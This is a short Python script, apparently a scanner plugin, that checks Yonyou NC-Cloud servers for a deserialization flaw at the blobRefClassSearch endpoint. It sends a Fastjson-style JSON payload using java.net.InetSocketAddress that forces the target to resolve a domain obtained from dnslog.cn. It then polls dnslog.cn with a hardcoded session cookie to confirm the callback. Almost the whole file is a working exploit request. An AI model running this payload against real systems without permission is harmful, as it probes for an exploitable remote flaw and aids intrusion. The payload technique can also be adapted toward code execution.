import time

import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友NC-Cloud接口blobRefClassSea存在反序列化漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
        "Content-Type": "application/json"
    }
    vurl = urllib.parse.urljoin(url, "/ncchr/pm/ref/indiIssued/blobRefClassSearch")
    try:
        getdomain = requests.get(url='http://dnslog.cn/getdomain.php',
                                 headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
        domain = str(getdomain.text)
        data = """{"clientParam":"{\\\"x\\\":{\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"111111.%s\\\"}}}"}""" % (
            domain)
        requests.post(vurl, verify=False, headers=headers, data=data, timeout=25)
        for i in range(0, 3):
            refresh = requests.get(url='http://dnslog.cn/getrecords.php',
                                   headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
            time.sleep(1)
            if domain in refresh.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult

verify('1')